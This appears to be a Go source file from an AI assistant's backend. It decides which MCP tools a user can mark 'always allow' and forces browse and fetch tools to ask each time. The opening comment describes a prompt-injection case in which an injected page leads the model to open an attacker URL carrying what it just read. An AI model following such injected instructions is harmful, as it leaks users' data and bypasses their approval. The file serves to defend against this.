package mcptools

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"unicode"
	"unicode/utf8"
)

// alwaysAskExact and alwaysAskParts are the tools that ask every time,
// whatever a trusted list says: each fetches an address the model chose, so
// a page that injects instructions can have the model open
// https://attacker/?q=<what it just read>. One approval says nothing about
// the next address. The exact names are Browserbase's, Exa's and Tavily's;
// the parts catch the same kind of tool on servers nobody has listed.
//
// The Python tier keeps the same two lists in app/mcp_security/tool_trust.py
// and the settings page's trust route refuses these names by them. A name
// added to one list must be added to the other.
var alwaysAskExact = map[string]bool{
	"navigate": true, "goto": true, "open_url": true, "web_fetch_exa": true,
	"crawling_exa": true, "tavily_extract": true, "tavily_crawl": true, "tavily_map": true,
}

var alwaysAskParts = []string{"fetch", "crawl", "navigate", "scrape", "browse"}

// alwaysAsks reports whether a tool, by its server's own name, asks every
// time.
func alwaysAsks(name string) bool {
	lowered := strings.ToLower(name)
	if alwaysAskExact[lowered] {
		return true
	}
	for _, part := range alwaysAskParts {
		if strings.Contains(lowered, part) {
			return true
		}
	}
	return false
}

// maxTrustedNameRunes is the longest name the trusted list takes.
const maxTrustedNameRunes = 255

// storable reports whether a tool's name can be put in a connection's
// config and read back by everything that reads it.
//
// The column is json, which accepts any text spelled as JSON, and two kinds
// of text then break its readers: U+0000, which jsonb cannot hold, so every
// statement that casts the column fails from then on; and a lone surrogate,
// which the Python tier's serialiser refuses, answering 500 for the
// connection and for every list it appears in. Control characters and very
// long names are refused with them: no honest tool name has either, and the
// name is shown on a settings page.
func storable(name string) bool {
	if name == "" || !utf8.ValidString(name) || utf8.RuneCountInString(name) > maxTrustedNameRunes {
		return false
	}
	for _, r := range name {
		// A lone surrogate cannot reach here as itself: Go's decoders turn
		// one into U+FFFD, which is refused for what it stands for.
		if r == utf8.RuneError || unicode.IsControl(r) {
			return false
		}
	}
	return true
}

// Why Trust refuses. The route that handles "always allow" tells them apart
// to answer the person; none of them is a failure of the server.
var (
	// ErrNotMCP: the name is not one of this turn's MCP tools.
	ErrNotMCP = errors.New("mcptools: not an MCP tool of this turn")
	// ErrAlwaysAsks: the tool is one that asks every time.
	ErrAlwaysAsks = errors.New("mcptools: this tool always asks before running")
	// ErrUnstorable: the tool's name cannot be saved.
	ErrUnstorable = errors.New("mcptools: this tool's name cannot be saved")
	// ErrGone: the connection is no longer the account's (it was removed
	// or switched off while the turn waited).
	ErrGone = errors.New("mcptools: the tool's server is no longer connected")
)

// Trusted reports whether a call to the tool the model knows as name may
// run without asking. mcp is false when name is not one of this turn's MCP
// tools, and the caller should ask whoever does own that tool.
//
// The answer is read from the connection's row now and remembered nowhere:
// a tool untrusted on the settings page asks again at its very next call,
// from any process, with nothing to invalidate. The row is read as the
// asker's own, so a connection that is not theirs trusts nothing.
func (t *Set) Trusted(ctx context.Context, name string) (trusted, mcp bool, err error) {
	entry, found := t.entry(name)
	if !found {
		return false, false, nil
	}
	if entry.alwaysAsk {
		return false, true, nil
	}
	row, err := t.source.rows.Connection(ctx, t.userID, entry.connectorID)
	if err != nil {
		return false, true, fmt.Errorf("mcptools: reading connection %d: %w", entry.connectorID, err)
	}
	if row == nil {
		return false, true, nil
	}
	for _, listed := range readTrusted(row.Config) {
		// By the server's own name: the name the model was given can change
		// when another server is connected, and trust must not move with it.
		if listed == entry.name {
			return true, true, nil
		}
	}
	return false, true, nil
}

// CanTrust reports whether Trust would accept the tool, so that an approval
// card offers "always allow" only where the click would be honoured. It
// reads the connection's row to see that it is still the asker's.
func (t *Set) CanTrust(ctx context.Context, name string) (bool, error) {
	entry, found := t.entry(name)
	if !found || entry.alwaysAsk || !storable(entry.name) {
		return false, nil
	}
	row, err := t.source.rows.Connection(ctx, t.userID, entry.connectorID)
	if err != nil {
		return false, fmt.Errorf("mcptools: reading connection %d: %w", entry.connectorID, err)
	}
	return row != nil, nil
}

// Trust records "always allow" for the tool the model knows as name: the
// server's own name is added to its connection's trusted_tools, which is
// where the settings page lists it and removes it.
//
// It refuses with ErrNotMCP, ErrAlwaysAsks, ErrUnstorable or ErrGone.
// Nothing is invalidated afterwards, because nothing caches trust.
func (t *Set) Trust(ctx context.Context, name string) error {
	entry, found := t.entry(name)
	switch {
	case !found:
		return ErrNotMCP
	case entry.alwaysAsk:
		return ErrAlwaysAsks
	case !storable(entry.name):
		return ErrUnstorable
	}
	found, err := t.source.rows.AddTrusted(ctx, t.userID, entry.connectorID, entry.name)
	if err != nil {
		return fmt.Errorf("mcptools: saving trust on connection %d: %w", entry.connectorID, err)
	}
	if !found {
		return ErrGone
	}
	return nil
}
